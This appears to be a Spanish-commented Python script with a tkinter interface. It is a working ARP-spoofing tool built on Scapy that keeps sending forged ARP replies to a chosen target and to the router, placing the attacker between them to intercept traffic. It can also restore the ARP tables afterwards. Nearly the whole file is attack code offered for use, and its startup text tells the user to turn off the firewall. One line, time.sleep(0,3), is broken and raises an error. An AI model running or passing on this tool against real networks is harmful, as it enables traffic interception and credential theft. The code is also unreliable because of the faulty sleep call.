import tkinter as tk
from tkinter import scrolledtext, messagebox
from scapy.all import ARP, Ether, sendp, getmacbyip, conf
import time
import threading
import os
import platform
import ctypes  # Añadido para la verificación de privilegios en Windows

# ===== CONFIGURACIÓN DE RED (AJUSTA ESTOS VALORES) =====
INTERFAZ_RED = "Wi-Fi 2"  # Nombre exacto de tu interfaz (ver con 'netsh interface show interface')
IP_PUERTA_ENLACE = "192.168.0.1"
MAC_PUERTA_ENLACE = "b0:92:4a:b5:64:27"  # MAC del router (de tu tabla ARP)
MAC_ATACANTE = "90:2e:16:ba:4c:35"       # MAC de tu interfaz Wi-Fi (de ipconfig /all)
# ======================================================

# Configuración de Scapy
conf.use_pcap = True
conf.verb = 0
conf.iface = INTERFAZ_RED  # Fuerza el uso de la interfaz correcta

# Variables globales
ataque_en_curso = False

def verificar_privilegios():
    try:
        if platform.system() == 'Windows':
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.getuid() == 0  # Root en Linux/macOS
    except Exception as e:
        messagebox.showerror("Error", f"No se pudo verificar privilegios: {str(e)}")
        return False

def obtener_mac(ip):
    """Versión mejorada con getmacbyip y manejo de errores detallado."""
    try:
        mac = getmacbyip(ip)
        if mac:
            return mac.lower()  # Scapy devuelve MAC en minúsculas
        print(f"[!] No se pudo obtener MAC para {ip} (¿Firewall/ARP cache?)")
        return None
    except Exception as e:
        print(f"[!] Error crítico al obtener MAC de {ip}: {str(e)}")
        return None

def spoofing_arp(ip_objetivo, widget_salida):
    global ataque_en_curso
    mac_objetivo = obtener_mac(ip_objetivo)
    
    if not mac_objetivo:
        widget_salida.insert(tk.END, "❌ No se pudo obtener MAC del objetivo\n")
        return

    widget_salida.insert(tk.END, f"✅ Objetivo: {ip_objetivo} [MAC: {mac_objetivo}]\n")
    widget_salida.insert(tk.END, f"✅ Router: {IP_PUERTA_ENLACE} [MAC: {MAC_PUERTA_ENLACE}]\n")

    try:
        while ataque_en_curso:
            # Spoof al objetivo (diciendo que somos el router)
            sendp(
                Ether(src=MAC_ATACANTE, dst=mac_objetivo) /
                ARP(op=2, hwsrc=MAC_ATACANTE, psrc=IP_PUERTA_ENLACE, 
                    hwdst=mac_objetivo, pdst=ip_objetivo),
                verbose=0
            )
            
            # Spoof al router (diciendo que somos el objetivo)
            sendp(
                Ether(src=MAC_ATACANTE, dst=MAC_PUERTA_ENLACE) /
                ARP(op=2, hwsrc=MAC_ATACANTE, psrc=ip_objetivo,
                    hwdst=MAC_PUERTA_ENLACE, pdst=IP_PUERTA_ENLACE),
                verbose=0
            )
            
            widget_salida.insert(tk.END, f"[+] Envenenando ARP: {ip_objetivo} <-> Router\n")
            time.sleep(0,3)
    except Exception as e:
        widget_salida.insert(tk.END, f"[!] Error en spoofing: {str(e)}\n")

def restaurar_arp(ip_objetivo):
    mac_objetivo = obtener_mac(ip_objetivo)
    if mac_objetivo and MAC_PUERTA_ENLACE:
        # Restaura ARP del objetivo
        sendp(
            Ether(dst=mac_objetivo) /
            ARP(op=2, hwsrc=MAC_PUERTA_ENLACE, psrc=IP_PUERTA_ENLACE,
                hwdst=mac_objetivo, pdst=ip_objetivo),
            count=5, verbose=0
        )
        # Restaura ARP del router
        sendp(
            Ether(dst=MAC_PUERTA_ENLACE) /
            ARP(op=2, hwsrc=mac_objetivo, psrc=ip_objetivo,
                hwdst=MAC_PUERTA_ENLACE, pdst=IP_PUERTA_ENLACE),
            count=5, verbose=0
        )

def iniciar_spoofing():
    global ataque_en_curso
    if not verificar_privilegios():
        return
        
    ip_objetivo = entrada_ip.get().strip()
    if not ip_objetivo:
        messagebox.showerror("Error", "Ingresa una IP objetivo")
        return
        
    widget_salida.delete(1.0, tk.END)
    ataque_en_curso = True
    threading.Thread(
        target=spoofing_arp, 
        args=(ip_objetivo, widget_salida),
        daemon=True
    ).start()

def detener_spoofing():
    global ataque_en_curso
    ataque_en_curso = False
    ip_objetivo = entrada_ip.get().strip()
    if ip_objetivo:
        restaurar_arp(ip_objetivo)
    widget_salida.insert(tk.END, "\n[✓] Ataque detenido. Tabla ARP restaurada\n")

# Interfaz gráfica
ventana = tk.Tk()
ventana.title("ARP Spoofer Avanzado - VirtualBox/Wi-Fi")

tk.Label(ventana, text="IP Objetivo:").pack(pady=5)
entrada_ip = tk.Entry(ventana, width=30)
entrada_ip.pack(pady=5)
entrada_ip.insert(0, "192.168.0.16")  # IP de tu VM por defecto

frame_botones = tk.Frame(ventana)
frame_botones.pack(pady=10)

boton_iniciar = tk.Button(
    frame_botones, 
    text="Iniciar Spoofing", 
    command=iniciar_spoofing, 
    bg='#4CAF50', fg='white'
)
boton_iniciar.pack(side=tk.LEFT, padx=5)

boton_detener = tk.Button(
    frame_botones, 
    text="Detener Spoofing", 
    command=detener_spoofing, 
    bg='#F44336', fg='white'
)
boton_detener.pack(side=tk.LEFT, padx=5)

widget_salida = scrolledtext.ScrolledText(ventana, width=70, height=20, wrap=tk.WORD)
widget_salida.pack(pady=10)

# Info inicial
widget_salida.insert(tk.END, f"🔧 Configuración de red:\n")
widget_salida.insert(tk.END, f" - Interfaz: {INTERFAZ_RED}\n")
widget_salida.insert(tk.END, f" - Tu MAC: {MAC_ATACANTE}\n")
widget_salida.insert(tk.END, f" - Router: {IP_PUERTA_ENLACE} [{MAC_PUERTA_ENLACE}]\n\n")
widget_salida.insert(tk.END, "⚠️ Asegúrate de:\n")
widget_salida.insert(tk.END, " 1. Ejecutar como administrador\n")
widget_salida.insert(tk.END, " 2. Tener desactivado el firewall\n")

ventana.mainloop()